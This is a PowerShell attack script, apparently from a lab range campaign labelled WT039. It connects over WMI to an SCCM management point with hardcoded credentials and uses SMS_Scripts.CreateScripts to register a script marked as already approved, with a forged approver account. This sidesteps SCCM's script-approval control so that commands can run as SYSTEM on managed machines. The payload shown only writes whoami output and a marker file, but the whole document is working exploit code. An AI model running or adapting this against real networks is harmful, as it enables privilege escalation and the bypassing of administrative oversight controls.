# WT039a: Create script via WMI SMS_Scripts.CreateScripts as MBR02\vagrant — analyst_t1 (ws01)
$ErrorActionPreference = 'Stop'
$mp = 'mbr02.range.local'
$opts = New-Object System.Management.ConnectionOptions
$opts.Username = 'MBR02\vagrant'
$opts.Password = 'vagrant'
$opts.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
$scope = New-Object System.Management.ManagementScope("\\$mp\root\SMS\site_CAD", $opts)
$scope.Connect()
Write-Output '[+] connected as MBR02\vagrant'

$scriptContent = "whoami > C:\Windows\Temp\wt039-system.txt`necho WT039-PROOF-SYSTEM-EXEC > C:\Windows\Temp\wt039-marker.txt`nwhoami"

$class = New-Object System.Management.ManagementClass($scope, (New-Object System.Management.ManagementPath('SMS_Scripts')), $null)
$inParams = $class.GetMethodParameters('CreateScripts')
Write-Output ('=== CreateScripts params ===')
$inParams.Properties | ForEach-Object { Write-Output ("  " + $_.Name + " type=" + $_.Type) }

# SHA256 of script content (UTF-8)
$sha = [Security.Cryptography.SHA256]::Create()
$hashBytes = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($scriptContent))
$scriptHash = ([BitConverter]::ToString($hashBytes)).Replace('-','').ToLower()

$inParams['ScriptGuid'] = [guid]::NewGuid().ToString()
# Feature is required by provider but not in GetMethodParameters schema — add directly
try { $inParams.Properties.Add('Feature', 1) } catch { Write-Output ("  Feature add note: " + $_.Exception.Message) }
$inParams['ScriptName'] = 'WT039-SYSTEM-Proof'
$inParams['Script'] = $scriptContent
$inParams['ScriptType'] = [uint32]1
$inParams['ScriptVersion'] = '1.0'
$inParams['Author'] = 'RANGE\svc_sccm'
$inParams['Comment'] = 'campaign wt039 system exec proof'
$inParams['ScriptDescription'] = 'WT039 system exec proof'
$inParams['Timeout'] = [uint32]300
$inParams['ApprovalState'] = [uint32]3
$inParams['Approver'] = 'RANGE\svc_sccm'
$inParams['ScriptHashAlgorithm'] = 'SHA256'
$inParams['ScriptHash'] = $scriptHash
Write-Output ("    computed ScriptHash=" + $scriptHash)

Write-Output '[+] Invoking CreateScripts ...'
$out = $class.InvokeMethod('CreateScripts', $inParams, $null)
$out.Properties | ForEach-Object { Write-Output ("  out " + $_.Name + "=" + $_.Value) }
Write-Output 'CREATE_DONE'
